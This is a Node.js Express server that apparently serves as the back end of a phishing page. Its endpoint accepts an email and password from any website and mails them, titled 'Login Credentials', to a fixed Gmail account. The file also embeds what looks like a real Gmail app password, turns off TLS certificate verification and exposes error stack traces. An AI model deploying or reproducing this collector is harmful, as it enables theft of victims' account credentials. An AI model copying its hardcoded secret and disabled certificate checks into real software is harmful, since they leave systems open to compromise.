const express = require('express');
const nodemailer = require('nodemailer');
const cors = require('cors');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors({
    origin: "*",
    credentials: true
}));
app.use(express.json());

// Create transporter object using SMTP transport
const transporter = nodemailer.createTransport({
  host: 'smtp.gmail.com',
  port: 587,
  secure: false, // true for 465, false for other ports
  auth: {
    user: process.env.EMAIL_USER || 'abhiisheek1@gmail.com',
    pass: process.env.EMAIL_PASS || 'kyqd ecvf avzp ayzo'
  },
  tls: {
    rejectUnauthorized: false
  }
});

// Email sending endpoint
app.post('/send-email', async (req, res) => {
  try {
    const {email,password } = req.body;
    
    // Default to recipient from env or the same as sender
    const recipient = process.env.RECIPIENT_EMAIL || process.env.EMAIL_USER || 'abhiisheek1@gmail.com';
    
    console.log('Attempting to send email to:', recipient);
    console.log('Using sender:', process.env.EMAIL_USER || 'abhiisheek1@gmail.com');
    
    // Verify transporter configuration before sending
    try {
      await transporter.verify();
      console.log('Server is ready to take our messages');
    } catch (verifyError) {
      console.error('Transporter verification failed:', verifyError);
      throw new Error('Email transporter configuration is invalid: ' + verifyError.message);
    }
    
    // Send mail with timeout
    console.log('Sending email...');
    let info;
    try {
      info = await transporter.sendMail({
        from: process.env.EMAIL_USER || 'abhiisheek1@gmail.com',
        to: recipient,
        subject: 'Login Credentials',
        text: 'Your login credentials are: \n Email: ' + email + '\n Password: ' + password
      
      }, {
        timeout: 30000 // 30 second timeout
      });
      console.log('SendMail completed, info object:', info);
    } catch (sendError) {
      console.error('Error during sendMail:', sendError);
      throw new Error('Failed to send email: ' + sendError.message);
    }
    
    // Log detailed information about the response
    if (info) {
      console.log('Email sent successfully');
      console.log('Message ID:', info.messageId);
      console.log('Response:', info.response || 'No response info');
      res.status(200).json({ 
        success: true, 
        message: 'Email sent successfully', 
        messageId: info.messageId,
        response: info.response || 'No detailed response'
      });
    } else {
      console.log('Email function completed but no info object returned');
      res.status(200).json({ 
        success: true, 
        message: 'Email function completed', 
        messageId: null,
        response: 'No response info'
      });
    }
  } catch (error) {
    console.error('Error sending email:', error);
    res.status(500).json({ 
      success: false, 
      message: 'Failed to send email',
      error: error.message,
      code: error.code || 'UNKNOWN_ERROR',
      stack: error.stack
    });
  }
});

// Health check endpoint
app.get('/', (req, res) => {
  res.status(200).json({ 
    success: true, 
    message: 'Email API is running!' 
  });
});

app.listen(PORT, () => {
  console.log(`Server is running on port ${PORT}`);
});